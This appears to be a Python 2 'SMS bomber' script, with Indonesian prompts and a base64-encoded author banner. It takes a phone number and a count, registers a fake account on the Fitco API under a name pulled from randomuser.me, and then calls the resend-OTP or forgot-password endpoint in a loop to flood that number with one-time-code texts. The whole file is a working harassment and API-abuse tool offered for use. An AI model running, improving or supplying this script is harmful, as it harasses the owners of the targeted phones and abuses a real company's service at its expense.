import requests
import json
import base64
enc = "ICAgICAgICAgICAgICAgICAgICAgICAvXCAgICAgICAgICAgICAvXAogICAgICAgICAgICAgICAgICAgICAgfGBcXF8sLS09Ij0tLSxfLy9gfAogICAgICAgICAgICAgICAgICAgICAgXCAuIiAgOicuIC4nOiAgIi4gLwogICAgICAgICAgICAgICAgICAgICA9PSkgIF8gOiAgJyAgOiBfICAoPT0KICAgICAgICAgICAgICAgICAgICAgICB8Pi9PXCAgIF8gICAvT1w8fAogICAgICAgICAgICAgICAgICAgICAgIHwgXC0ifmAgXyBgfiItLyB8CiAgICAgICAgICAgICAgICAgICAgICA+fGA9PT0uIFxfLyAuPT09YHw8CiAgICAgICAgICAgICAgICAuLSItLiAgIFw9PT0nICB8ICAnPT09LyAgIC4tIi0uCi4tLS0tLS0tLS0tLS0tLXsnLiAnYH0tLS1cLCAgLi0nLS4gICwvLS0tey4nLiAnfS0tLS0tLS0tLS0tLS0tLgogKSAgICAgICAgICAgICBgIi0tLSJgICAgICBgfi09PT0tfmAgICAgIGAiLS0tImAgICAgICAgICAgICAgKAooICAgICAgICAgICBfX19fXyBfIF8gICAgICAgICAgICAgICBfX18gX19fX18gX19fXyAgICAgICAgICAgICkKICkgICAgICAgICB8ICBfX18oXykgfF8gX19fIF9fXyAgICAvIF8gXF8gICBffCAgXyBcICAgICAgICAgICgKKCAgICAgICAgICB8IHxfICB8IHwgX18vIF9fLyBfIFwgIHwgfCB8IHx8IHwgfCB8XykgfCAgICAgICAgICApCiApICAgICAgICAgfCAgX3wgfCB8IHx8IChffCAoXykgfCB8IHxffCB8fCB8IHwgIF9fLyAgICAgICAgICAoCiggICAgICAgICAgfF98ICAgfF98XF9fXF9fX1xfX18vICAgXF9fXy8gfF98IHxffCAgICAgICAgICAgICAgKQogKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKAonLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScKQ29kZWQgQnk6IE1haGFyZGlrYSBLdW4KRkI6IGh0dHBzOi8vZmFjZWJvb2suY29tL2Rpa2EuZW9qCg=="
message_bytes = base64.b64decode(enc)
message = message_bytes.decode('ascii')
print(message)

nomer = raw_input("Nomer : ")
jumlah = input("Jumlah : ")

nama = requests.get('https://randomuser.me/api/')
parsing = json.loads(nama.text)
fname = parsing['results'][0]['name']['first']
lname = parsing['results'][0]['name']['last']
longn = fname+lname
mail = longn.lower()+"@gmail.com"
urlreg = "https://api.fitco.id/user/register?user_longitude=101.778137&user_latitude=-5.107306"
urlresend = "https://api.fitco.id/user/resendOTP?user_longitude=101.778137&user_latitude=-5.107306"
urlforgot = "https://api.fitco.id/user/forgotPassword?user_longitude=101.778137&user_latitude=-5.107306"
headers = {'accept': 'application/json','authorization': 'Bearer null','api_version': '1','user_lang': 'en','x-custom-fitco-shop-guest-authentication': 'FITCO_SHOP','Content-Type': 'application/json','Content-Length': '170','Host': 'api.fitco.id','Connection': 'close','Accept-Encoding': 'gzip, deflate','User-Agent': 'okhttp/3.12.1'}
reg = requests.post(urlreg, json={"data":{"c_password":"Lookatm3","email":mail,"first_name":longn,"last_name":"","password":"Lookatm3","phone":nomer,"promo_code":""}}, headers=headers, timeout=None)
respreg = json.loads(reg.text)
if(respreg['status'] == "error"):
	print("Nomor sudah terdaftar, Menggunakan OTP Forgot Password")
	for loop in range(jumlah):
		forg = requests.post(urlforgot, json={"data":{"phone":nomer,"via":"sms"}}, headers=headers, timeout=None)
		status = json.loads(forg.text)
		if(status['status'] == "success"):
			print("["+str(loop)+"]"+" Berhasil Mengirim OTP")
else:
	print("Berhasil Mendaftarkan, Menggunakan OTP Register")
	for loop in range(jumlah):
		resend = requests.post(urlresend, json={"data":{"phone":nomer,"email":mail}}, headers=headers, timeout=None)
		status = json.loads(resend.text)
		if(status['status'] == "success"):
			print("["+str(loop)+"]"+" Berhasil Mengirim OTP")
		else:
			print("["+str(loop)+"]"+" Gagal Mengirim OTP")
